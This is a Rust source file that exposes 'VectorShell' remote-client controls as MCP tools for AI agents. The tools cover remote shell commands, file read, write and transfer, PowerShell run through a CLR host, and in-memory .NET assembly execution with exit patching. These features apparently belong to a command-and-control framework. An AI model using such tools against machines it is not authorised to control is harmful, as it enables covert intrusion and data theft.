//! VectorShell tools mapped to MCP tool definitions.

use serde_json::{json, Value};

use super::protocol::{CallToolParams, CallToolResult, ListToolsResult, McpContent, McpTool};

/// Returns the MCP tool definitions for all VectorShell tools.
pub fn list_mcp_tools() -> ListToolsResult {
    ListToolsResult {
        tools: vec![
            exec_tool_def(),
            read_file_tool_def(),
            write_file_tool_def(),
            upload_file_tool_def(),
            download_file_tool_def(),
            powershell_clr_tool_def(),
            dotnet_assembly_tool_def(),
        ],
    }
}

/// Dispatch a tool call by name, extracting install_id from arguments.
pub async fn call_mcp_tool(
    params: &CallToolParams,
    dispatch_fn: impl Fn(&str, &str, Value, Option<u64>) -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<serde_json::Value, String>> + Send>>,
) -> Result<CallToolResult, String> {
    match params.name.as_str() {
        "exec" => call_exec(&params.arguments, &dispatch_fn).await,
        "read_file" => call_read_file(&params.arguments, &dispatch_fn).await,
        "write_file" => call_write_file(&params.arguments, &dispatch_fn).await,
        "upload_file" => call_upload_file(&params.arguments, &dispatch_fn).await,
        "download_file" => call_download_file(&params.arguments, &dispatch_fn).await,
        "powershell_clr" => call_powershell_clr(&params.arguments, &dispatch_fn).await,
        "dotnet_assembly" => call_dotnet_assembly(&params.arguments, &dispatch_fn).await,
        _ => Err(format!("unknown tool: {}", params.name)),
    }
}

// ─── Tool definitions ────────────────────────────────────────────────────────

fn exec_tool_def() -> McpTool {
    McpTool {
        name: "exec".into(),
        title: Some("Execute Shell Command".into()),
        description: Some("Run a shell command on the selected remote client. Returns stdout, stderr, and exit code.".into()),
        input_schema: json!({
            "type": "object",
            "properties": {
                "install_id": {
                    "type": "string",
                    "description": "Target client install_id (from /api/sessions)"
                },
                "command": {
                    "type": "string",
                    "description": "Shell command to execute"
                }
            },
            "required": ["install_id", "command"]
        }),
    }
}

fn read_file_tool_def() -> McpTool {
    McpTool {
        name: "read_file".into(),
        title: Some("Read File".into()),
        description: Some("Read a text file from the remote client.".into()),
        input_schema: json!({
            "type": "object",
            "properties": {
                "install_id": {
                    "type": "string",
                    "description": "Target client install_id (from /api/sessions)"
                },
                "path": {
                    "type": "string",
                    "description": "Path to the file to read"
                }
            },
            "required": ["install_id", "path"]
        }),
    }
}

fn write_file_tool_def() -> McpTool {
    McpTool {
        name: "write_file".into(),
        title: Some("Write File".into()),
        description: Some("Write text content to a file on the remote client.".into()),
        input_schema: json!({
            "type": "object",
            "properties": {
                "install_id": {
                    "type": "string",
                    "description": "Target client install_id (from /api/sessions)"
                },
                "path": {
                    "type": "string",
                    "description": "Path to write to"
                },
                "content": {
                    "type": "string",
                    "description": "Text content to write"
                }
            },
            "required": ["install_id", "path", "content"]
        }),
    }
}

fn upload_file_tool_def() -> McpTool {
    McpTool {
        name: "upload_file".into(),
        title: Some("Upload File".into()),
        description: Some("Upload a server-local file to the remote client.".into()),
        input_schema: json!({
            "type": "object",
            "properties": {
                "install_id": {
                    "type": "string",
                    "description": "Target client install_id (from /api/sessions)"
                },
                "src": {
                    "type": "string",
                    "description": "Server-local source file path"
                },
                "dst": {
                    "type": "string",
                    "description": "Destination path on the remote client"
                }
            },
            "required": ["install_id", "src", "dst"]
        }),
    }
}

fn download_file_tool_def() -> McpTool {
    McpTool {
        name: "download_file".into(),
        title: Some("Download File".into()),
        description: Some("Download a file from the remote client to the server.".into()),
        input_schema: json!({
            "type": "object",
            "properties": {
                "install_id": {
                    "type": "string",
                    "description": "Target client install_id (from /api/sessions)"
                },
                "src": {
                    "type": "string",
                    "description": "Source path on the remote client"
                },
                "dst": {
                    "type": "string",
                    "description": "Destination path on the server"
                }
            },
            "required": ["install_id", "src", "dst"]
        }),
    }
}

fn powershell_clr_tool_def() -> McpTool {
    McpTool {
        name: "powershell_clr".into(),
        title: Some("Execute PowerShell (Windows)".into()),
        description: Some("Execute a PowerShell script via CLR host. Windows clients only.".into()),
        input_schema: json!({
            "type": "object",
            "properties": {
                "install_id": {
                    "type": "string",
                    "description": "Target client install_id (from /api/sessions)"
                },
                "script": {
                    "type": "string",
                    "description": "PowerShell script to execute"
                }
            },
            "required": ["install_id", "script"]
        }),
    }
}

fn dotnet_assembly_tool_def() -> McpTool {
    McpTool {
        name: "dotnet_assembly".into(),
        title: Some("Execute .NET Assembly (Windows)".into()),
        description: Some("Execute a .NET EXE from artifact bytes in-memory. Windows clients only.".into()),
        input_schema: json!({
            "type": "object",
            "properties": {
                "install_id": {
                    "type": "string",
                    "description": "Target client install_id (from /api/sessions)"
                },
                "artifact_id": {
                    "type": "string",
                    "description": "Server artifact ID containing .NET EXE bytes"
                },
                "runtime_version": {
                    "type": "string",
                    "description": "CLR runtime version: v2, v3, or v4 (default: v4)"
                },
                "args": {
                    "type": "array",
                    "items": { "type": "string" },
                    "description": "Arguments passed to the assembly Main method"
                },
                "domain": {
                    "type": "string",
                    "description": "Optional CLR AppDomain name"
                },
                "patch_exit": {
                    "type": "boolean",
                    "description": "Patch Environment.Exit to avoid killing the host process (default: false)"
                }
            },
            "required": ["install_id"]
        }),
    }
}

// ─── Tool call dispatch ────────────────────────────────────────────────────

type DynFuture = std::pin::Pin<Box<dyn std::future::Future<Output = Result<serde_json::Value, String>> + Send>>;

async fn call_exec(
    args: &Value,
    dispatch_fn: &impl Fn(&str, &str, Value, Option<u64>) -> DynFuture,
) -> Result<CallToolResult, String> {
    let install_id = get_install_id(args)?;
    let command = get_str(args, "command")?;
    let tool_args = json!({ "command": command });
    let result = dispatch_fn(&install_id, "exec", tool_args, Some(60_000)).await?;
    Ok(CallToolResult {
        content: vec![McpContent::text(serde_json::to_string_pretty(&result).unwrap_or_default())],
        is_error: None,
    })
}

async fn call_read_file(
    args: &Value,
    dispatch_fn: &impl Fn(&str, &str, Value, Option<u64>) -> DynFuture,
) -> Result<CallToolResult, String> {
    let install_id = get_install_id(args)?;
    let path = get_str(args, "path")?;
    let tool_args = json!({ "path": path });
    let result = dispatch_fn(&install_id, "read_file", tool_args, Some(60_000)).await?;
    Ok(CallToolResult {
        content: vec![McpContent::text(serde_json::to_string_pretty(&result).unwrap_or_default())],
        is_error: None,
    })
}

async fn call_write_file(
    args: &Value,
    dispatch_fn: &impl Fn(&str, &str, Value, Option<u64>) -> DynFuture,
) -> Result<CallToolResult, String> {
    let install_id = get_install_id(args)?;
    let path = get_str(args, "path")?;
    let content = get_str(args, "content")?;
    let tool_args = json!({ "path": path, "content": content });
    let result = dispatch_fn(&install_id, "write_file", tool_args, Some(60_000)).await?;
    Ok(CallToolResult {
        content: vec![McpContent::text(serde_json::to_string_pretty(&result).unwrap_or_default())],
        is_error: None,
    })
}

async fn call_upload_file(
    args: &Value,
    dispatch_fn: &impl Fn(&str, &str, Value, Option<u64>) -> DynFuture,
) -> Result<CallToolResult, String> {
    let install_id = get_install_id(args)?;
    let src = get_str(args, "src")?;
    let dst = get_str(args, "dst")?;
    let tool_args = json!({ "src": src, "dst": dst });
    let result = dispatch_fn(&install_id, "upload_file", tool_args, Some(60_000)).await?;
    Ok(CallToolResult {
        content: vec![McpContent::text(serde_json::to_string_pretty(&result).unwrap_or_default())],
        is_error: None,
    })
}

async fn call_download_file(
    args: &Value,
    dispatch_fn: &impl Fn(&str, &str, Value, Option<u64>) -> DynFuture,
) -> Result<CallToolResult, String> {
    let install_id = get_install_id(args)?;
    let src = get_str(args, "src")?;
    let dst = get_str(args, "dst")?;
    let tool_args = json!({ "src": src, "dst": dst });
    let result = dispatch_fn(&install_id, "download_file", tool_args, Some(60_000)).await?;
    Ok(CallToolResult {
        content: vec![McpContent::text(serde_json::to_string_pretty(&result).unwrap_or_default())],
        is_error: None,
    })
}

async fn call_powershell_clr(
    args: &Value,
    dispatch_fn: &impl Fn(&str, &str, Value, Option<u64>) -> DynFuture,
) -> Result<CallToolResult, String> {
    let install_id = get_install_id(args)?;
    let script = get_str(args, "script")?;
    let tool_args = json!({ "script": script });
    let result = dispatch_fn(&install_id, "powershell_clr", tool_args, Some(120_000)).await?;
    Ok(CallToolResult {
        content: vec![McpContent::text(serde_json::to_string_pretty(&result).unwrap_or_default())],
        is_error: None,
    })
}

async fn call_dotnet_assembly(
    args: &Value,
    dispatch_fn: &impl Fn(&str, &str, Value, Option<u64>) -> DynFuture,
) -> Result<CallToolResult, String> {
    let install_id = get_install_id(args)?;
    let mut tool_args = serde_json::Map::new();
    if let Some(v) = args.get("artifact_id").and_then(|v| v.as_str()) {
        tool_args.insert("artifact_id".into(), json!(v));
    }
    if let Some(v) = args.get("runtime_version").and_then(|v| v.as_str()) {
        tool_args.insert("runtime_version".into(), json!(v));
    }
    if let Some(v) = args.get("args").and_then(|v| v.as_array()) {
        tool_args.insert("args".into(), json!(v));
    }
    if let Some(v) = args.get("domain").and_then(|v| v.as_str()) {
        tool_args.insert("domain".into(), json!(v));
    }
    if let Some(v) = args.get("patch_exit").and_then(|v| v.as_bool()) {
        tool_args.insert("patch_exit".into(), json!(v));
    }
    let result = dispatch_fn(
        &install_id,
        "dotnet_assembly",
        serde_json::Value::Object(tool_args),
        Some(120_000),
    )
    .await?;
    Ok(CallToolResult {
        content: vec![McpContent::text(serde_json::to_string_pretty(&result).unwrap_or_default())],
        is_error: None,
    })
}

// ─── Helpers ───────────────────────────────────────────────────────────────

fn get_install_id(args: &Value) -> Result<String, String> {
    args.get("install_id")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .ok_or_else(|| "install_id is required".to_string())
}

fn get_str(args: &Value, key: &str) -> Result<String, String> {
    args.get(key)
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .ok_or_else(|| format!("{} is required", key))
}
